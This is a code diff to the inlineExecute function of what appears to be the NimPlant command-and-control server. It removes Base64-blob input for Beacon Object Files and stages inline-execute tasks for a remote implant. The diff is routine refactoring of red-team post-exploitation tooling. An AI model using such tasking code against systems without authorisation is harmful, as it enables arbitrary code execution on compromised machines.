@@ -275,7 +275,6 @@ def inlineExecute(np, args, raw_command):
     from .crypto import encryptData
     import binascii
 
-    taskFriendly = raw_command
     try:
         file = args[1]
         entryPoint = args[2]
@@ -288,15 +287,11 @@ def inlineExecute(np, args, raw_command):
         )
         return
 
-    # Check if BOF is provided as file path (normal use) or Base64 blob (GUI)
-    try:
-        if os.path.isfile(file):
-            with open(file, "rb") as f:
-                assembly = f.read()
-        else:
-            assembly = base64.b64decode(file)
-            taskFriendly = "inline-execute"  # Truncate big B64 blob
-    except:
+    # Check if BOF file path is provided correctly
+    if os.path.isfile(file):
+        with open(file, "rb") as f:
+            assembly = f.read()
+    else:
         nimplantPrint(
             "Invalid BOF file specified.",
             np.guid,
@@ -375,7 +370,7 @@ def inlineExecute(np, args, raw_command):
 
     commandArgs = " ".join([assembly, entryPoint, assemblyArgs_final])
     command = f"inline-execute {commandArgs}"
-    guid = np.addTask(command, taskFriendly=taskFriendly)
+    guid = np.addTask(command, taskFriendly=raw_command)
     nimplantPrint("Staged inline-execute command for NimPlant.", np.guid, taskGuid=guid)
 
 
